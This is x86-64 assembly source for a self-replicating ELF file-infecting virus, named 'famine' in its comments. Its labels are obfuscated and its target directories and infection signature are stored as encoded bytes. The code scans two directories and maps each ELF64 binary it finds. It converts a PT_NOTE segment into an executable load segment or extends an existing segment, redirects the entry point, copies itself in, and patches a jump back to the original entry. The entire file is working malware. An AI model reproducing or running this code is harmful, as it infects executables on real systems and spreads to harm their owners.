%include "obf_file.inc"

bits 64 
default rel

section .text
global _start

_start:
; placing famine on the stack
push rbp
mov rbp, rsp
PUSHA
lea rdi, [rel bMSGXfLImM]     ; dir to open for arg readDir
mov rsi, kTROD4BLIp
call IYaktk1

lea rdi, [rel JDrLqjIQOL]
mov rsi, SE2PRP 
call IYaktk1
vK3aOIlmvq:
POPA
mov rsp, rbp
pop rbp
IJ6oCVD:
jmp VgZQF1U6

; take directory to open in rdi && size of pwd on rsi
IYaktk1:
push rbp
mov rbp, rsp
sub rsp, famine_size
lea r8, FAM(famine.fd)
or qword [r8], -1
lea r8, FAM(famine.pwdPtr)
mov [r8], rdi
lea r8, FAM(famine.lenghtPwd)
mov [r8], rsi
mov rax, 2
mov rsi, 0x0000| O_DIRECTORY 
xor rdx, rdx
syscall
cmp rax, 0 
jl H2J2Mtr
lea rdi, FAM(famine.fd)                         ; enregistre le fd dans la struct
mov [rdi], rax

xBzjkmukC9:
lea r10, FAM(famine.fd)
mov rdi, [r10]
lea r9, FAM(famine.total_read)              ; init total_read
mov DWORD[r9], 0 
mov rax, 217; getdents64(int fd, void *buf, size_t size_buf) 
lea rsi, FAM(famine.dirents)
mov rdx, 0x1000
syscall
cmp rax, 0 
jle H2J2Mtr

lea r10, FAM(famine.dirents_struct_ptr)  ; r10 -> (struct famine.diretents_struct_ptr)
mov [r10], rsi                           ; famine.dirents_struct_ptr -> famine.dirents
lea r11, FAM(famine.total_to_read)       ; r11 -> (struct famine.total_to_read)
mov DWORD [r11], eax ; famine.total_to_read = getdents total length 

Tmo0Azkn:
lea r8, FAM(famine.total_read)        ; r8 -> total lu de getdents
lea r9, FAM(famine.total_to_read)        ; r9 -> total a lire de getdents
mov r10, FAM(famine.dirents_struct_ptr)  ; r10 -> actual dirent struct
lea r11, FAM(famine.dirents_struct_ptr)  ; r11 -> ptr de la struct actuelle
movzx r12, WORD [r10 + D_RECLEN_OFF] ; r12 = length de la stuct dirents actuelle 
add [r8], r12d                          ; update du total lu dans r8
add [r11], r12                           ; famine.diretns_struct_ptr -> sur la prochaine struct
cmp BYTE [r10 + D_TYPE], 0x8; verifie le type du fichier 
jne c0cbT52fg

DwgktXgwmM:
lea rsi, [r10 + D_NAME] ; charge le nom du fichier dans rsi 
mov byte [rsi - 1], '/'
sub rsi, FAM(famine.lenghtPwd)
mov rdi, FAM(famine.pwdPtr)
call laUokU

qEDRPok:
call bteTPzu

c0cbT52fg:
mov r8, FAM(famine.total_read)
mov r12, FAM(famine.total_to_read)
cmp r8d, r12d                   ; if (total lu >= total getdents)
jge xBzjkmukC9
jmp Tmo0Azkn

bteTPzu:
push rbp
mov rbp, rsp
sub rsp, infection_size
lea rax, INF(infection.injection_offset)
mov qword [rax], 0 
lea rax, INF(infection.add_page)
mov byte [rax], 0 
lea rax, INF(infection.mem_eof)
mov qword [rax], 0 

CXAxu:
mov rax, 2
mov rdi, rsi
mov rsi, 0x0002
xor rdx, rdx
syscall
cmp rax, 0x0 
jl pnb4D
mov INF(infection.file_fd), rax

; === get file size ===
MVM2p8q:
mov rax, 8
mov rdi, INF(infection.file_fd)
mov rsi, 0x0 
mov rdx, 0x2
syscall
cmp rax, 0x0 
jle D6SnGfstJ
mov INF(infection.map_size), rax
mov INF(infection.original_end), rax

dodoXuT:
; rax -> map
mov rsi, rax        ; rsi = file_size
mov rax, 9
mov rdi, 0x0 
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl D6SnGfstJ
lea r8, INF(infection.map_addr)
mov [r8], rax

aXnwHKM8Ui:
cmp dword [rax + 1], 0x02464c45 ; if != 'ELF64' 
jne lvrM7i3csx

gskyKo2:
; rax == total segment number
; r9 == injection offset
; r13 == original segment end offset
; r14 -> header table
; r15 -> map
mov r15, rax
mov r14, r15
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx
Os6BeWY:
cmp cx, [r15  + elf64_ehdr.e_phnum]
jge ubR1fhMfH 
add r14, elf64_phdr_size
inc rcx
jmp Os6BeWY
ubR1fhMfH:
mov INF(infection.last_seg_hdr_addr), r14
xor r9, r9
HkJgn:
cmp cx, 0 
jle cufklZMPe9
QdXgWAKm4:
bt word [r14], 0 ; is segment header's first bit != 0 
jnc vMmlsa4n
bt qword [r14], 0x20 ; is segment header's 33rd bit == 1 
jc ItsjjBoY4
vMmlsa4n:
dec rcx
sub r14, elf64_phdr_size
jmp HkJgn

cufklZMPe9:
mov r9, INF(infection.injection_offset)
cmp r9, 0 
je lvrM7i3csx
cmp byte INF(infection.add_page), 1 ; if new page needed jump _add page 
je RzT8N9Sr8
jmp FQocSYG          ; else jmp FQocSYG

ItsjjBoY4:
; Check if the segment signed, else check the size, if big enough save the offsets if not already done
qBUlmlwP:
; r8 -> potential Uc0VnaZ6W5
; r9 == Uc0VnaZ6W5 variable
mov r8, r15
add r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
sub r8, FP5drmFAzI
mov r9, [rel Uc0VnaZ6W5]
cmp qword r9, [r8]
je lvrM7i3csx

Jz00aVLxCR:
mov r9, INF(infection.injection_offset)
test r9, r9
jz naR9wYU2
mov r9, INF(infection.add_page)
test r9, r9
jz vMmlsa4n

naR9wYU2:
; r8 == end of infection offset
; r9 == next segment offset
mov r8, [r14 + elf64_phdr.p_offset]
add r8, [r14 + elf64_phdr.p_filesz]
mov r13, r8        ; save segment end's offset
add r8, CODE_LEN 
mov r9, r14
add r9, elf64_phdr_size
add r9, elf64_phdr.p_offset
cmp [r9], r8
setb INF(infection.add_page)   ; if ([r9] < r8) { infection.add_page = 1) }

GvIwG0wV:
; r8 -> infection structure members
; r9 == injection address
; r12 == original entrypoint
;*r13 == segment end's offset (naR9wYU2)
;*r14 -> segment header in header table
lea r8, INF(infection.seg_nb)
mov [r8], cl
lea r8, INF(infection.original_entry)
mov r12, [r15 + elf64_ehdr.e_entry]
mov [r8], r12
lea r8, INF(infection.injection_offset)
mov [r8], r13
lea r8, INF(infection.injection_addr)
push r9
mov r9, [r14 + elf64_phdr.p_vaddr]
add r9, [r14 + elf64_phdr.p_memsz]
mov [r8], r9
pop r9
lea r8, INF(infection.seg_hdr_addr)
mov [r8], r14
jmp vMmlsa4n

RzT8N9Sr8:
iNXpWV4B8H:
mov rax, 77
mov rdi, INF(infection.file_fd)
lea rsi, INF(infection.map_size)
push qword [rsi]
add qword [rsi], 0x1000
and qword [rsi], -4096
add qword [rsi], CODE_LEN 
mov rsi, [rsi]
syscall
pop rsi
cmp rax, 0 
jl lvrM7i3csx

oN0WM2Zge:
mov rdi, INF(infection.map_addr)
mov rax, 11
syscall

ACk5XpE:
mov rax, 9
mov rdi, 0x0 
mov rsi, INF(infection.map_size)    ; rsi = file_size
mov rdx, 2| 4| 1
mov r10, 1
mov r8, INF(infection.file_fd)
mov r9, 0x0 
syscall
cmp rax, 0x0 ; rax -> map (used later) 
jl D6SnGfstJ
lea r8, INF(infection.map_addr)
mov [r8], rax

gJgjvOqlv:
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_shnum]
add r14, [r14 + elf64_ehdr.e_shoff]
xor rcx, rcx

BFNUA1M1:
cmp rcx, rax
jge sHgeNOD6C
mov rbx, [r14 + elf64_shdr.sh_addr]
add rbx, [r14 + elf64_shdr.sh_size]
cmp INF(infection.mem_eof), rbx
jge jxqHzpIq8
mov INF(infection.mem_eof), rbx

jxqHzpIq8:
add r14, elf64_shdr_size
inc rcx
jmp BFNUA1M1 

sHgeNOD6C:

FebkA:
; r14 -> segmentS header
; rcx == segment counter
mov r14, INF(infection.map_addr)
movzx rax, word [r14 + elf64_ehdr.e_phnum]
add r14, [r14 + elf64_ehdr.e_phoff]
xor rcx, rcx

yjMkg:
cmp rcx, rax
jge lVlnu7Ke
cmp dword [r14 + elf64_phdr.p_type], 0x4
je f17iX98te

QAw4M7Ik:
add r14, elf64_phdr_size
inc rcx
jmp yjMkg

lVlnu7Ke:
mov r14, -1 ; detect if no note found. See f17iX98te line 1 

f17iX98te:
; r14 -> segment header
; rax == new offset / address
cmp r14, 0 
jl zCIG5IX5cG
mov dword [r14 + elf64_phdr.p_type], 0x1
mov qword [r14 + elf64_phdr.p_flags], 0x1| 0x4
mov qword [r14 + elf64_phdr.p_filesz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_memsz], CODE_LEN 
mov qword [r14 + elf64_phdr.p_align], 0x1000 
mov rax, INF(infection.original_end)
add rax, 0x1000 
and rax, -4096
mov qword [r14 + elf64_phdr.p_offset], rax
mov qword INF(infection.injection_offset), rax
mov rax, INF(infection.mem_eof)
add rax, 0x1000 
and rax, -4096
mov qword INF(infection.injection_addr), rax
mov qword [r14 + elf64_phdr.p_vaddr], rax
mov qword [r14 + elf64_phdr.p_paddr], rax

FQocSYG:
B5muE6SZp:
; r8 -> elf header entrypoint
; r9 == end of segment + align (injection offset)
; r10 == injection offset
mov r8, INF(infection.map_addr)
add r8, elf64_ehdr.e_entry
mov r10, INF(infection.injection_addr)
mov [r8], r10
cmp byte INF(infection.add_page), 0 
jg iwNLXtMh
mov rdi, CODE_LEN 
call FlppP

iwNLXtMh:
; rdi -> injection start
; rsi -> parasite _start
; rcx == code len (VaOYO - _start)
mov rdi, INF(infection.map_addr)
add rdi, INF(infection.injection_offset)
lea rsi, [rel _start]     ; rsi -> start of our code
mov rcx, CODE_LEN ; counter will decrement 
cld          ; copy from _start to VaOYO (= !std)
rep movsb

zCIG5IX5cG:
; r8 -> IJ6oCVD instruction's addr (IJ6oCVD + 1)
; r9 == distance to jump from final jump to original entry point
mov r8, INF(infection.map_addr)
add r8, INF(infection.injection_offset)
add r8, FINJMP_OFF 
inc r8
mov r10, INF(infection.injection_addr)
add r10, FINJMP_OFF 
add r10, 0x05 
mov r9, INF(infection.original_entry)
sub r9, r10
mov [r8], r9d
jmp lvrM7i3csx

FlppP:
; r8 -> segment header data
;*r14 -> segment header in header table

mov r8, INF(infection.seg_hdr_addr)
push r8           ; save header start for later

; * Update file size *
add r8, qword elf64_phdr.p_filesz
add qword [r8], rdi
pop r8

; * Update memory size *
add r8, elf64_phdr.p_memsz
add qword [r8], rdi

ret

lvrM7i3csx:
lea rdi, INF(infection.map_addr)
lea rsi, INF(infection.map_size)
mov rax, 11
syscall
jmp D6SnGfstJ

D6SnGfstJ:
mov rax, 3
mov rdi, INF(infection.file_fd)
syscall
mov qword INF(infection.file_fd), -1
jmp pnb4D

H2J2Mtr:
mov rdi, FAM(famine.fd)
cmp rdi, 0 
jle pnb4D
mov rax, 3
syscall
or qword FAM(famine.fd), -1
jmp pnb4D

pnb4D:
leave
ret

VgZQF1U6:
mov rax, 60 
xor rdi, rdi
syscall

;strcpy(dst:rsi src: rdi) (without /0 at the end)
laUokU:
xor rcx, rcx
SI3Rzi0:
cmp byte [rdi + rcx], 0 
je AVtfQxBc3
mov al, byte [rdi + rcx]
mov [rsi + rcx], al
add rcx, 1 
jmp SI3Rzi0

AVtfQxBc3:
; mov byte [rsi + rcx], 0 
ret

; debug
; strlen(str:rsi)
kFnZDbos:
xor rcx, rcx

heHTN0tFJ:
cmp byte [rsi + rcx], 0 
je MDszWDY2Z
inc rcx
jmp heHTN0tFJ

MDszWDY2Z:
mov rax, rcx
ret


bMSGXfLImM db 0x5B, 0x44, 0x5B, 0x59, 0x48, 0x48, 0x56, 0x2D, 0x21, 0x4D 
kTROD4BLIp    equ $ - bMSGXfLImM
JDrLqjIQOL db 0x5B, 0x44, 0x5B, 0x59, 0x48, 0x48, 0x56, 0x2D, 0x21, 0x7F, 0x41 
SE2PRP equ $ - JDrLqjIQOL 
m5CVd db 0x44, 0x22, 0x22, 0x22, 0x22, 0x00 
Uc0VnaZ6W5 db 0x32, 0x51, 0x5B, 0x40, 0x09, 0x59, 0x13, 0x28, 0x30, 0x3F, 0x32, 0x4B, 0x1B, 0x5E, 0x16, 0x18, 0x49, 0x0C, 0x13, 0x76, 0x36, 0x64, 0x2E, 0x46, 0x11, 0x54, 0x16, 0x4B, 0x1E, 0x1C, 0x52, 0x30, 0x23, 0x24, 0x2F, 0x41, 0x11, 0x5E, 0x1B, 0x4C, 0x02, 0x58, 0x4A, 0x5E 
FP5drmFAzI equ $ - Uc0VnaZ6W5
VaOYO: 